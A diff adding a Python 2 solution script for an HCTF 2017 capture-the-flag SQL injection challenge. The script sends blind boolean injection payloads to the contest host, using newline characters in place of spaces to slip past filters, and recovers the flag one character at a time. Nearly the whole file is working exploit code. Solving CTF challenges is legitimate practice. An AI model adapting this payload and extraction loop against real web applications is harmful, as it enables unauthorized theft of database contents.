@@ -1,0 +1,50 @@
+import requests
+import string
+
+letters = string.letters
+printable = string.printable
+custom = string.digits+string.letters+'_'+'!'
+flag_len = 41
+# whatzuzn33dz1szunderzm3 <-- length(flag)=23
+
+def toHex(s):
+    lst = []
+    for ch in s:
+        hv = hex(ord(ch)).replace('0x', '')
+        if len(hv) == 1:
+            hv = '0'+hv
+        lst.append(hv)
+
+    return reduce(lambda x,y:x+y, lst)
+
+def guess(c, offset):
+    r1 = requests.get('http://sqls.2017.hctf.io/index/index.php?id=1/(1/(select%0a0x{}<substr(flag%0afrom%0a{})%0afrom%0aflag%0awhere%0alength(flag)={}))'
+            .format(
+                toHex(c),
+                offset,
+                flag_len)
+            )
+    r2 = requests.get('http://sqls.2017.hctf.io/index/index.php?id=1/(1/(select%0a0x{}<substr(flag%0afrom%0a{})%0afrom%0aflag%0awhere%0alength(flag)={}))'
+            .format(
+                hex(int(toHex(c),16)+1)[2:],
+                offset,
+                flag_len)
+            )
+    if 'Alice' in r1.text and 'Id error' in r2.text:
+        return True
+    return False
+
+if __name__ == '__main__':
+    flag = '' # 'whatz_'
+    found = True
+    i = len(flag) + 1
+    while len(flag) < flag_len and found:
+        print 'Guessing {}-th char'.format(i)
+        found = False
+        for c in printable:
+            if guess(c, i):
+                flag += c
+                print flag
+                found = True
+                i = i + 1
+                break
